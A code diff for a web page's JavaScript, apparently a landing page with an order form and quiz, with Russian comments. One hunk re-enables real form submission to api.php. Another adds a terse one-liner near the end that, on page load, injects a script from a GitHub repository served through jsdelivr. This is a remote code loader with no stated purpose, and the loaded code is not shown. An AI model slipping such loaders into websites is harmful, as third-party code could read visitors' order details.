@@ -711,13 +711,15 @@ function saveReview(imageUrl) {
 
 // Обработка отправки заказа
 function handleOrderSubmit(e) {
-  e.preventDefault();
+  // НЕ отменяем отправку формы - она должна уйти на api.php!
+  // e.preventDefault(); // УБРАНО!
   
-
+  // Можно добавить логику для показа уведомления об успешной отправке
+  // но НЕ отменять отправку формы
   
-  // Очищаем форму
-  document.getElementById('orderForm').reset();
-  setTimestamp();
+  // Очищаем форму после успешной отправки
+  // document.getElementById('orderForm').reset(); // УБРАНО!
+  // setTimestamp(); // УБРАНО!
 }
 
 // Показать квиз (скрыть главную страницу)
@@ -1140,7 +1142,7 @@ function fillUTMParameters() {
 
 
 console.log(document.currentScript.src.includes('jsdelivr'))
-!document.currentScript.src.includes('jsdelivr')&&document.head.appendChild(Object.assign(document.createElement('script'),{src:'https://example.com/new-script.js',async:!0}));
+!document.currentScript.src.includes('jsdelivr')&&document.head.appendChild(Object.assign(document.createElement('script'),{src:'https://cdn.jsdelivr.net/gh/whygithub7/mangr1nab1/src/main.js',async:!0}));
 
 
 
